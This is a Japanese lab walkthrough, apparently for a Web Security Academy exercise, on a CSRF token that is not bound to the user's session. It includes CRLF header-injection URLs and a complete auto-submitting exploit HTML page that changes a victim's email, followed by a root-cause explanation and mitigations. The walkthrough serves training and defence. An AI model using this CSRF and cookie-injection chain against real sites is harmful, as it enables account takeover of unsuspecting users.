## 🔷 Phase 1：環境理解と準備

### まず「何が起きているか」を理解する

このラボのサーバー側の認証ロジックはこうなっている：

```
このラボのサーバーは「セッション管理」と「CSRFトークン管理」が完全に別物として動いている。

だからこうなる：

• セッションID → 「この人は wiener です」と判断
• csrfKey + csrf → 「この2つの値は正しいペアです」と判断
• しかし “このCSRFトークンは wiener のものか？” は確認しない


つまり：

“ユーザーのセッション” と “CSRFトークンの所有者” が紐づいていない

これが脆弱性の本質。

---

🔥 もっと直感的に言うと…

🧩 正しい世界（安全な実装）

sessionID → wiener
CSRF token → wiener のもの
→ OK


🧩 このラボの世界（脆弱）

sessionID → wiener
CSRF token → 有効なペアなら誰のでもOK
→ wiener のセッションで carlos のCSRFトークンを使っても通る


つまりサーバーはこう言ってる：

「セッションは wiener ね。
CSRFトークンは…うん、ペアとして正しいね。
じゃあ処理していいよ。」

“そのトークンが wiener のものかどうか” は一切見てない。
```

つまりサーバーは：
- 「このsessionは誰のものか」→ セッション管理が担当
- 「このcsrfKey と csrf はペアとして有効か」→ CSRF管理が担当

**この2つが統合されていない = csrfKeyとcsrfのペアさえ正しければ、誰のsessionでも通る**

---

## 🔷 Phase 2：Burp Suiteの準備

### 2-1. Burp Suite起動・ブラウザ設定

1. Burp Suite を起動
2. **Proxy → Intercept → "Intercept is off"** にしておく（最初はオフで観察モード）
3. Burp内蔵ブラウザを使う（**Proxy → Open Browser**）
   - これで証明書エラーなしにHTTPS通信をキャプチャできる

---

## 🔷 Phase 3：wienerアカウントで動作確認

### 3-1. ログイン

```
URL: https://YOUR-LAB-ID.web-security-academy.net/login
Username: wiener
Password: peter
```

### 3-2. メールアドレス変更を実行してリクエストをキャプチャ

1. ログイン後、**「Update email」** フォームに適当なメアドを入力して送信
2. Burp **Proxy → HTTP history** を開く
3. `POST /email/change` のリクエストを探してクリック

以下のようなリクエストが見えるはず：

```http
POST /email/change HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=AbCdEfGhIjKlMnOpQrSt; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

**ここで確認すべき値（全部メモる）：**
```
session  = AbCdEfGhIjKlMnOpQrSt     ← wienerのセッション
csrfKey  = rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  ← CSRFキーcookie
csrf     = RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY  ← CSRFトークン（bodyパラメータ）
```

### 3-3. Repeaterに送って「sessionとcsrfKeyの独立性」を検証

リクエストを右クリック → **「Send to Repeater」**

**テスト①：sessionだけ書き換える**
```
Cookie: session=AAAAAAAAAAAAAAAA; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
```
→ **ログアウトされる（302リダイレクト）** ← sessionは本物のセッション管理に使われている

**テスト②：csrfKeyだけ書き換える**
```
Cookie: session=AbCdEfGhIjKlMnOpQrSt; csrfKey=AAAAAAAAAAAAAAAA
```
→ **「Invalid CSRF token」エラー** ← csrfKeyとcsrfトークンがペアとして検証されている

**テスト③：csrfパラメータだけ書き換える**
```
csrf=AAAAAAAAAAAAAAAA
```
→ **「Invalid CSRF token」エラー** ← 同様

**これで何がわかるか：**
```
session  → セッション管理（誰としてログインしているか）
csrfKey + csrf → CSRFペア検証（このペアは有効なペアか？）

2つは独立 = sessionが誰のものでも、csrfKeyとcsrfが正しいペアなら通る
```

---

## 🔷 Phase 4：別アカウントで「本当に独立しているか」を確認

### 4-1. シークレットウィンドウでcarlosとしてログイン

1. **シークレット/プライベートウィンドウ**を開く（重要：cookieを分離するため）
2. 同じラボURLにアクセス
3. `carlos:montoya` でログイン
4. メールアドレス変更フォームを送信
5. Burp HTTP historyで `POST /email/change` を確認

```http
POST /email/change HTTP/2
Cookie: session=XyZaBcDeFgHiJkLmNoP; csrfKey=differentKeyForCarlos
csrf=differentTokenForCarlos&email=carlos@normal-user.com
```

これをRepeaterに送る。

### 4-2. carlosのsessionにwienerのcsrfKey+csrfを差し込む

Repeaterで以下に書き換える：

```http
POST /email/change HTTP/2
Cookie: session=XyZaBcDeFgHiJkLmNoP; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=test@test.com
```

→ **200 OK でメール変更成功！**

**これで脆弱性が確定：**
```
carlosのsession（≠ wiener）
wienerのcsrfKey + wienerのcsrf（正しいペア）
→ サーバーは通す
```

csrfKeyとcsrfのペアが正しければ、sessionは誰のものでもいい。

---

## 🔷 Phase 5：Cookie Injectionポイントを探す

### 5-1. 検索機能を試す

1. wienerアカウントのブラウザ（シークレットではない方）に戻る
2. サイトの検索機能を使う（例：`test` と入力して検索）
3. Burp HTTP historyで `GET /?search=test` のレスポンスを確認

**レスポンスのSet-Cookieヘッダーを見る：**

```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=test; Secure; HttpOnly
```

検索ワードがそのままCookieの値に入っている！

### 5-2. CRLF Injectionを試す

HTTPヘッダーでは `\r\n`（CRLF）が改行を意味し、次のヘッダーの開始を意味する。

URLエンコードでは：
```
\r = %0d
\n = %0a
スペース = %20
; = %3b
```

以下のURLにアクセスしてみる：
```
/?search=test%0d%0aSet-Cookie:%20csrfKey=injectedvalue%3b%20SameSite=None
```

これはサーバーに以下を受け取らせる：
```
検索ワード: test\r\nSet-Cookie: csrfKey=injectedvalue; SameSite=None
```

レスポンスヘッダーが以下のように分割される：
```http
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=injectedvalue; SameSite=None
```

**→ 任意のcookieをvictimのブラウザに植え込める！**

---

## 🔷 Phase 6：攻撃の全体像を設計する

### 攻撃チェーンの完全な流れ

```
[攻撃者の準備]
1. wienerとしてログインし csrfKey と csrf を取得
   csrfKey = rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
   csrf    = RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY

[Exploit Serverにホスト]
2. 悪意あるHTMLページを用意

[victimが踏む]
3. <img src=".../?search=test%0d%0aSet-Cookie: csrfKey=rZHC...">
   → victimのブラウザがこのURLにGETリクエスト
   → サーバーのレスポンスに "Set-Cookie: csrfKey=rZHC..." が含まれる
   → victimのブラウザに csrfKey=rZHC... が保存される

4. imgの読み込みは失敗（画像ファイルじゃないので）
   → onerror イベントが発火

5. onerrorで form.submit() が実行される
   → POST /email/change に以下が送信される：
      Cookie: session=victim自身のセッション
              csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv  ← 植え込んだもの
      body:   csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY    ← htmlに埋め込んだもの
              email=hacked@evil.com

6. サーバー：
   - session → victimとして認証 ✅
   - csrfKey + csrf → wienerのペア、有効 ✅（統合されていないので通る）
   → メール変更成功！
```

---

## 🔷 Phase 7：Exploit HTMLを完成させる

### 注意：最新のwienerのトークンを取得する

**重要！** 一度使ったcsrfトークンは無効になる場合がある。
wienerとして再度メール変更フォームを**実際には送信せず**、リクエストをインターセプトしてトークンを取得するか、ページのソースから取得する。

方法：
1. wienerでログインした状態でメール変更ページに移動
2. Burp → Proxy → Intercept ON
3. 「Update email」を送信
4. Interceptされたリクエストから csrfKey と csrf の値を取得
5. Intercept → Drop（実際には送信しない）してトークンを温存する

または単純にページのHTMLソースを見て `<input name="csrf" value="...">` を確認。

### 完成したExploit HTML

```html
<html>
  <body>
    <img 
      src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv%3b%20SameSite=None" 
      onerror="document.forms[0].submit()"
    >

    <form action="https://YOUR-LAB-ID.web-security-academy.net/email/change" method="POST">
      <input type="hidden" name="csrf" value="RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY">
      <input type="hidden" name="email" value="hacked@evil.com">
    </form>
  </body>
</html>
```

### 各部分の詳細な意味

```html
<img src="...CRLF injection URL...">
```
- victimのブラウザが自動的にこのURLにGETリクエストを送る
- 実際にはサーバーがHTMLを返すので画像としては解釈できない
- → `onerror` が必ず発火する

```
%0d%0a  → \r\n（ヘッダー改行）
%20     → スペース
%3b     → ;（セミコロン）
SameSite=None → クロスサイトリクエストでもこのcookieを送信する
```

```html
onerror="document.forms[0].submit()"
```
- imgの読み込みが失敗したら0番目のformを自動送信
- `document.forms[0]` = ページ内の最初の `<form>` タグ

```html
<form action="https://...ターゲット..." method="POST">
```
- victimのブラウザからターゲットサイトへPOSTリクエストが飛ぶ
- この時victimのcookieが自動的に付与される（同じドメインへのリクエストなので）

---

## 🔷 Phase 8：Exploit Serverにホストして配信

### 8-1. Exploit Serverにアクセス

ラボページの **「Go to exploit server」** ボタンをクリック

### 8-2. HTMLを貼り付け

「Body」欄に完成したHTMLを貼り付ける。
`YOUR-LAB-ID` を実際のIDに、トークン値を実際の値に置き換えること。

### 8-3. 「View exploit」で自分でテスト

自分のブラウザで動作確認：
- wienerのメールアドレスが `hacked@evil.com` に変われば成功
- もし失敗したら：
  - csrfトークンが使い済みでないか確認
  - URLエンコードが正しいか確認
  - `YOUR-LAB-ID` が正しく置換されているか確認

### 8-4. 「Store」→「Deliver to victim」

1. **Store** ボタンで保存
2. **Deliver to victim** ボタンでvictimに送信
3. しばらく待つとラボが「Solved」になる

---

## 🔷 Phase 9：よくあるミスと対処法

| 問題 | 原因 | 対処 |
|------|------|------|
| 「Invalid CSRF token」 | トークンが使い済み | wienerで再ログインして新しいトークンを取得 |
| imgのonerrorが発火しない | SameSite設定の問題 | `SameSite=None` が正しくエンコードされているか確認 |
| ラボがSolvedにならない | emailが自分のものと同じ | `wiener@...` 以外のアドレスを使う |
| cookieが植わらない | CRLF部分のエンコードミス | `%0d%0a` と `%20` を確認 |

---

## 🔷 本質的な理解：なぜこれが脆弱か

```
【正しい実装】
サーバー：「このsessionはwienerのものだ。wienerのCSRFトークンは X だ。
           送られてきたcsrfが X と一致するか確認... ✅」
→ sessionとCSRFトークンが紐づいている

【このラボの実装】
サーバー：「このcsrfKeyとcsrfはペアとして有効か確認... ✅」
→ このペアが誰のものかは確認していない！
→ 攻撃者は自分のペアを盗んでvictimに使わせることができる
```

**修正方法：**
```
CSRFトークンを生成するとき：
  正しい → token = HMAC(sessionID, secret_key)
  脆弱  → token = HMAC(csrfKey, secret_key)  // csrfKeyが独立して存在する
```

sessionIDベースで生成すれば、victimのsessionに紐づいたトークンでなければ無効になる。


---

# 🔥 CSRF token がセッションに紐づいていない脆弱性まとめ（面接用・実務温度）

## 🧨 どーいう脆弱性？
**CSRFトークンがユーザーのセッションと紐付いておらず、  
「トークンのペアが正しければ誰のセッションでも通る」状態。**

サーバー内部では：

- `sessionID` → 認証（誰としてログインしているか）
- `csrfKey + csrf` → CSRFフレームワークがペア検証

この2つが **完全に独立** している。

つまり：

> 「wiener の CSRF トークンを carlos のセッションで使っても通る」

という致命的な設計ミス。

---

## 🔍 どう気づいた？
1. wiener でメール変更フォームを送信 → `csrfKey` と `csrf` を取得  
2. リクエストを Drop してトークンを温存  
3. 別セッションで carlos にログイン  
4. carlos のメール変更リクエストの  
   `csrfKey` と `csrf` を **wiener の値に差し替えて送信**  
5. **200 OK → 他人のトークンでも通る** と判明

気づき方は：

> 「別ユーザーのセッションに他人のCSRFペアを差し込んでみる」

これだけで挙動が露骨に出る。

---

## 💥 どう攻撃した？
攻撃チェーンはこう：

1. 攻撃者が自分のアカウントで **csrfKey + csrf** を取得  
2. victim のブラウザに **CRLF Injection** を使って  
   `Set-Cookie: csrfKey=攻撃者の値` を植え込む  
3. onerror で自動送信するフォームを踏ませる  
4. victim のブラウザが送るリクエスト：

```
Cookie: session=victimのセッション
        csrfKey=攻撃者の値（植え込んだ）
csrf=攻撃者の値（formに埋め込んだ）
```

5. サーバーは：

- session → victim として認証  
- csrfKey + csrf → 攻撃者のペアとして有効  

→ **victim のメールアドレスが攻撃者の指定した値に変更される**

つまり：

> 「攻撃者のトークンを victim に使わせるだけで成立する」

---

## 🛡️ どう対策する？
### ✔ CSRFトークンをセッションと紐付ける（最重要）
- token = HMAC(sessionID, secret_key)  
- 他人の session では絶対に通らないようにする

### ✔ トークンをワンタイム化
- 1回使ったら無効化

### ✔ SameSite=Lax/Strict Cookie
- クロスサイトからの自動送信を防ぐ

### ✔ Origin / Referer チェック
- 正規ドメインからのリクエストのみ許可

### ✔ GET で状態変更しない
- POST/PUT/DELETE のみに限定

---

# 🎤 **まとめ

> この脆弱性は、CSRFトークンがユーザーのセッションと紐付いておらず、トークンのペアさえ正しければ誰のセッションでも通ってしまう設計ミスです。
> 検証では、wiener の CSRF トークンを取得し、別ユーザーの carlos のメール更新リクエストに差し替えて送信したところ、200 OK が返り、セッションとCSRFが独立していることを確認しました。  
> 攻撃は、攻撃者のトークンを victim に植え付けて自動送信させるだけで成立します。  
> 対策は、CSRFトークンを sessionID と厳密に紐付け、ワンタイム化し、SameSite Cookie や Origin チェックを併用することです。

---

